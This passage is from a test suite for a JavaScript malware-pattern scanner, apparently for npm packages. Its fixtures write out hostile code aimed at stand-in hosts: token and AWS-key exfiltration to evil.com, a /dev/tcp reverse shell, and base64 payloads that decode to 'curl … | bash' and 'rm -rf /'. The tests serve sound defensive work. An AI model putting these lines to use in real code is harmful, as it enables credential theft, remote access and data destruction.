            expect(getFindings(code).length).toBe(0);
        });
    });

    // ============================================================================
    // Real-World NPM Malware Patterns
    // ============================================================================

    describe("real-world npm malware patterns", () => {
        it("detects NPM token exfiltration (event-stream pattern)", () => {
            const code = `
                const https = require('https');
                const token = process.env.NPM_TOKEN;
                https.request({
                    hostname: 'evil.com',
                    body: JSON.stringify({ token: process.env.NPM_TOKEN })
                });
            `;
            expect(findPattern(code, "fetch_with_env")).toBe(true);
        });

        it("detects preinstall script payload execution", () => {
            const code = `
                const cp = require('child_process');
                const encoded = "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==";
                eval(Buffer.from(encoded, "base64").toString());
            `;
            expect(findPattern(code, "encoded_payload_exec")).toBe(true);
        });

        it("detects reverse shell via eval obfuscation", () => {
            const code = `
                const e = "ev";
                const a = "al";
                globalThis[e + a]('require("child_process").exec("bash -i >& /dev/tcp/evil.com/8080 0>&1")');
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("detects credential harvesting via fetch", () => {
            const code = `
                fetch("https://collector.evil.com/data", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        npm: process.env.NPM_TOKEN,
                        github: process.env.GITHUB_TOKEN,
                        aws_key: process.env.AWS_ACCESS_KEY_ID,
                        aws_secret: process.env.AWS_SECRET_ACCESS_KEY
                    })
                });
            `;
            expect(findPattern(code, "fetch_with_env")).toBe(true);
        });

        it("detects String.fromCharCode eval reconstruction", () => {
            // eval(String.fromCharCode(99,111,110,115,111,108,101))
            const code = `eval(String.fromCharCode(99,111,110,115,111,108,101))`;
            // This triggers both: string_reconstruction (6+ args) 
            // but NOT encoded_payload_exec (that's atob/Buffer specific)
            expect(findPattern(code, "string_reconstruction")).toBe(true);
        });

        it("detects prototype pollution in dependency confusion", () => {
            const code = `
                function merge(target, source) {
                    for (const key in source) {
                        target[key] = source[key];
                    }
                    target.__proto__ = source;
                }
            `;
            expect(findPattern(code, "prototype_pollution")).toBe(true);
        });

        it("detects dynamic require for typosquat module loading", () => {
            const code = `
                const os = require('os');
                const hostname = os.hostname();
                require("evil-" + hostname.slice(0, 3));
            `;
            expect(findPattern(code, "dynamic_require")).toBe(true);
        });
    });

    // ============================================================================
    // Combined Attack Scenarios
    // ============================================================================

    describe("combined attack scenarios", () => {
        it("detects multi-step eval obfuscation", () => {
            const code = `
                const x = "ev";
                const y = "al";
                const payload = atob("YWxlcnQoMSk=");
                globalThis[x + y](payload);
            `;
            const findings = getFindings(code);
            expect(findings.some(f => f.pattern === "obfuscated_eval")).toBe(true);
        });

        it("detects exfiltration + timer combo", () => {
            const code = `
                setTimeout("fetch('https://evil.com?t=' + process.env.TOKEN)", 0);
            `;
            const findings = getFindings(code);
            // Should catch timer_obfuscation (string arg to setTimeout)
            expect(findings.some(f => f.pattern === "timer_obfuscation")).toBe(true);
        });

        it("detects require + timer chain", () => {
            const code = `
                const modName = getEvilModule();
                const mod = require(modName);
                setTimeout("mod.execute()", 0);
            `;
            const findings = getFindings(code);
            expect(findings.some(f => f.pattern === "dynamic_require")).toBe(true);
            expect(findings.some(f => f.pattern === "timer_obfuscation")).toBe(true);
        });

        it("detects all three: obfuscated eval + encoded payload + fetch", () => {
            const code = `
                globalThis["eval"]("1");
                eval(atob("code"));
                fetch("https://evil.com", { body: process.env.TOKEN });
            `;
            const findings = getFindings(code);
            expect(findings.some(f => f.pattern === "obfuscated_eval")).toBe(true);
            expect(findings.some(f => f.pattern === "encoded_payload_exec")).toBe(true);
            expect(findings.some(f => f.pattern === "fetch_with_env")).toBe(true);
        });

        it("multiple findings across multiple files via deepScanFiles", () => {
            const files = new Map([
                ["install.js", `eval(atob("ZXZhbCgncm0gLXJmIC8nKQ=="))`],
                ["postinstall.js", `fetch("https://evil.com", { body: process.env.NPM_TOKEN })`],
                ["index.js", `setTimeout("require('child_process').exec('curl evil.com')", 100)`],
                ["safe.js", `module.exports = { greet: () => "hello" }`],
            ]);
            const result = deepScanFiles(files);
            expect(result.filesAnalyzed).toBe(4);
            expect(result.findings.length).toBeGreaterThanOrEqual(3);
            // All critical findings should come first
            const criticIdx = result.findings.findIndex(f => f.severity === "critical");
            const highIdx = result.findings.findIndex(f => f.severity === "high");
            if (criticIdx >= 0 && highIdx >= 0) {
                expect(criticIdx).toBeLessThan(highIdx);
            }
        });
    });

    // ============================================================================
    // Edge Cases & Adversarial Inputs
    // ============================================================================

    describe("edge cases", () => {
        it("handles nested function scopes", () => {
            const code = `
                function outer() {
                    function inner() {
                        globalThis["eval"]("nested");
                    }
                }
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("handles arrow functions in callbacks", () => {
            const code = `
                [1,2,3].forEach(x => {
                    globalThis["eval"](x.toString());
                });
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("handles async/await context", () => {
            const code = `
                async function evil() {
                    const resp = await fetch("https://evil.com?d=" + process.env.SECRET);
                }
            `;
            expect(findPattern(code, "fetch_with_env")).toBe(true);
        });

        it("handles class methods", () => {
            const code = `
                class Exploit {
                    run() {
                        globalThis["eval"]("payload");
                    }
                }
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("handles try/catch blocks", () => {
            const code = `
                try {
                    globalThis["eval"]("test");
                } catch(e) {}
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("handles IIFE patterns", () => {
            const code = `
                (function() {
                    globalThis["eval"]("payload");
                })();
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("handles destructuring without false positives", () => {
            const code = `
                const { exec } = require('child_process');
                exec('ls');
            `;
            // exec is now a direct call, not computed member — should NOT trigger
            expect(findPattern(code, "computed_member_exec")).toBe(false);
        });

        it("handles spread arguments", () => {
            const code = `
                const args = [101, 118, 97, 108, 40, 41];
                String.fromCharCode(...args);
            `;
            // Spread makes it 1 argument (SpreadElement) not 6
            expect(findPattern(code, "string_reconstruction")).toBe(false);
        });

        it("handles single-line code", () => {
            const code = `globalThis["eval"]("1")`;
            const findings = getFindings(code);
            expect(findings.length).toBe(1);
            expect(findings[0].line).toBe(1);
        });

        it("handles multiple findings on same line", () => {
            const code = `globalThis["eval"]("1"); globalThis["Function"]("2")`;
            const findings = getFindings(code);
            expect(findings.length).toBe(2);
        });

        it("handles code with unicode identifiers", () => {
            const code = `const résultat = "eval"; globalThis[résultat]("1");`;
            // Unicode identifier should be tracked by constant propagation
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });
    });

    // ============================================================================
    // AST Walker Coverage
    // ============================================================================

    describe("AST walker", () => {
        it("walks into array elements", () => {
            const code = `
                const items = [globalThis["eval"]("in array")];
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("walks into object values", () => {
            const code = `
                const obj = { evil: globalThis["eval"]("in object") };
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("walks into conditional expressions", () => {
            const code = `
                const result = true ? globalThis["eval"]("ternary") : null;
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("walks into for loops", () => {
            const code = `
                for (let i = 0; i < 1; i++) {
                    globalThis["eval"]("loop");
                }
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("walks into switch cases", () => {
            const code = `
                switch(x) {
                    case 1: globalThis["eval"]("switch"); break;
                }
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });
    });

    // ============================================================================
    // Performance
    // ============================================================================

    describe("performance", () => {
        it("scans 1000-line file in under 500ms", () => {
            const lines: string[] = [];
            for (let i = 0; i < 1000; i++) {
                lines.push(`const var_${i} = "value_${i}";`);
                lines.push(`console.log(var_${i});`);
            }
            const code = lines.join("\n");

            const start = performance.now();
            const result = deepScanFile(code, "large.js");
            const elapsed = performance.now() - start;

            expect(result.parseError).toBe(false);
            expect(result.findings.length).toBe(0);
            expect(elapsed).toBeLessThan(500);
        });

        it("scans file with many findings efficiently", () => {
            const lines: string[] = [];
            for (let i = 0; i < 100; i++) {
                lines.push(`globalThis["eval"]("payload_${i}");`);
            }
            const code = lines.join("\n");

            const start = performance.now();
            const result = deepScanFile(code, "many-findings.js");
            const elapsed = performance.now() - start;

            expect(result.parseError).toBe(false);
            expect(result.findings.length).toBe(100);
            expect(elapsed).toBeLessThan(500);
        });

        it("deepScanFiles handles 50 files efficiently", () => {
            const files = new Map<string, string>();
            for (let i = 0; i < 50; i++) {
                files.set(`file_${i}.js`, `console.log("file ${i}"); const x_${i} = ${i};`);
            }

            const start = performance.now();
            const result = deepScanFiles(files);
            const elapsed = performance.now() - start;

            expect(result.filesAnalyzed).toBe(50);
            expect(result.findings.length).toBe(0);
            expect(elapsed).toBeLessThan(1000);
        });
    });

    // ============================================================================
    // API Stability — Return Types
    // ============================================================================

    describe("API contract", () => {
        it("deepScanFile always returns { findings, parseError }", () => {
            const result = deepScanFile(`console.log(1)`, "test.js");
            expect(result).toHaveProperty("findings");
            expect(result).toHaveProperty("parseError");
            expect(Array.isArray(result.findings)).toBe(true);
            expect(typeof result.parseError).toBe("boolean");
        });

        it("deepScanFiles always returns { findings, filesAnalyzed, parseErrors, scanTimeMs }", () => {
            const result = deepScanFiles(new Map());
            expect(result).toHaveProperty("findings");
            expect(result).toHaveProperty("filesAnalyzed");
            expect(result).toHaveProperty("parseErrors");
            expect(result).toHaveProperty("scanTimeMs");
            expect(Array.isArray(result.findings)).toBe(true);
            expect(typeof result.filesAnalyzed).toBe("number");
            expect(typeof result.parseErrors).toBe("number");
            expect(typeof result.scanTimeMs).toBe("number");
        });

        it("DeepScanFinding conforms to interface shape", () => {
            const findings = getFindings(`globalThis["eval"]("1")`);
            const f = findings[0];
            expect(typeof f.file).toBe("string");
            expect(typeof f.line).toBe("number");
            expect(typeof f.column).toBe("number");
            expect(["critical", "high", "medium"]).toContain(f.severity);
            expect(typeof f.pattern).toBe("string");
            expect(typeof f.description).toBe("string");
            expect(typeof f.code).toBe("string");
        });
    });
});
